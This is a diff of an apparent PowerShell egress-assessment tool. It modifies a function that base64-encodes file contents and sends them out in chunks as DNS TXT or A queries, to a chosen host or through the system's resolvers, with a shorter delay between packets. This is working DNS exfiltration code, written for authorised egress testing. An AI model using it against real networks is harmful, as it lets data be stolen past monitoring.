@@ -1982,12 +1982,12 @@ function Invoke-EgressAssess
                             $DataBytes += $aaa.GetRange($ByteReader, $DefaultLength)
                             $EncodedData = [System.Convert]::ToBase64String( $DataBytes)
                             
-                            Send-DNSPacket $EncodedData "TXT"
+                            Send-DNSPacket $EncodedData $true
 
                             Write-Verbose "[*] Sending data .... $PacketNumber/$TotalPackets"
                             $PacketNumber += 1
                             $ByteReader += $DefaultLength
-                            Start-Sleep -Milliseconds 800
+                            Start-Sleep -Milliseconds 100
                         }
                         catch
                         {
@@ -2003,7 +2003,7 @@ function Invoke-EgressAssess
                         #filename limited to 63 - ENDTHISFILETRANSMISSIONEGRESSASSESS.length.  we might have to send chunks over 
                         $filename = (Get-ChildItem $Datatype).Name
                         $EncodedData = "ENDTHISFILETRANSMISSIONEGRESSASSESS"+ $filename #[System.Text.Encoding]::UTF8.GetBytes("ENDTHISFILETRANSMISSIONEGRESSASSESS"+$DataType)
-                        Send-DNSPacket $EncodedData "TXT"
+                        Send-DNSPacket $EncodedData $true
                     }
                     catch
                     {
@@ -2085,8 +2085,8 @@ function Invoke-EgressAssess
                         $DataBytes = [System.Text.Encoding]::UTF8.GetBytes($DataToSend)
                         $EncodedData = [System.Convert]::ToBase64String($DataBytes)
                         $EncodedData = $EncodedData -replace "=", ".---"
-                        Send-DNSPacket $EncodedData "A"
-                        Invoke-Expression "nslookup.exe -querytype=A $EncodedData.$IP 2>&1" | Out-Null
+                        Send-DNSPacket $EncodedData $false
+                        
                         $ByteReader += 20
                     }
                 }
@@ -2215,34 +2215,51 @@ function Invoke-EgressAssess
                 break
             }
         }
-        function Send-DNSPacket
+                function Send-DNSPacket
         {
-            Param($dataX, $type);
+            Param($dataX, $txt=$false);
 
-            if ($type = "TXT")
+            if (!$Port)
             {
-                ###DNS TXT Query "Header"
-                #Trans ID  std query  
-                [Byte[]]$Mess=0x00,0x01,0x05,0x00,0x00
+                $Port = 53
+            }
+            #DNS TXT Query "Header"
+            #Trans ID  std query  
+            [Byte[]]$Mess=0x00,0x01,0x05,0x00,0x00
                     
-                #Ans       Auth    Add RR
-                [Byte[]]$Mess2= 0x00,0x00,0x00
+            #Ans       Auth    Add RR
+            [Byte[]]$Mess2= 0x00,0x00,0x00
                     
-                #no. of queries
-                $Mess = $Mess + [Bitconverter]::GetBytes([int]1) +$Mess2
+            #no. of queries
+            $Mess = $Mess + [Bitconverter]::GetBytes([int]1) +$Mess2
+
+            if ($txt)
+            {
+                $dns_Servers.Add(([System.Net.Dns]::GetHostAddresses($IP))[0].IPAddresstoString)
 
                 ###DNS TXT Query "Footer"
                 #suffix for each q
                 #        null     type    class 
                 $postS = 0x00,0x00,0x10,0x00,0x01
+            }
+            else #type A
+            {
+                $dns_Servers =  ipconfig /all | where-object {$_ –match “DNS Servers”} | foreach-object{$_.Split(“:”)[1]}
                 
+                $postS = 0x00,0x00,0x10,0x00,0x01
+                $dataX +=".$IP"
+            }
+            
+            foreach($addr in $dns_servers)
+            {
+                try
+                {
                 $Saddrf = [System.Net.Sockets.AddressFamily]::InterNetwork
                 $Stype = [System.Net.Sockets.SocketType]::Dgram
                 $Ptype = [System.Net.Sockets.ProtocolType]::UDP
+           
+                $addr = [System.Net.IPAddress]::Parse($addr.Trim())
 
-                $addr =  ([System.Net.Dns]::GetHostAddresses($IP))[0].IPAddresstoString
-
-                $addr = [System.Net.IPAddress]::Parse($addr)
                 $End = New-Object System.Net.IPEndPoint $addr, $Port;
                 $Sock = New-Object System.Net.Sockets.Socket $Saddrf, $Stype, $Ptype;
         	    $Sock.TTL = 26
@@ -2263,11 +2280,15 @@ function Invoke-EgressAssess
                 $Sock.Connect($End)
                 $Sock.Send($Buffer)
                 $Sock.Close()
-            }
-            if ($type = "A")
-            {
-
-
+                break
+                }
+                catch
+                {
+                    <#$ErrorMessage = $_.Exception.Message
+                    Write-Verbose "[*] Error, DNS failed with error:"
+                    Write-Verbose $ErrorMessage
+                    #>
+                }
             }
         }
     }
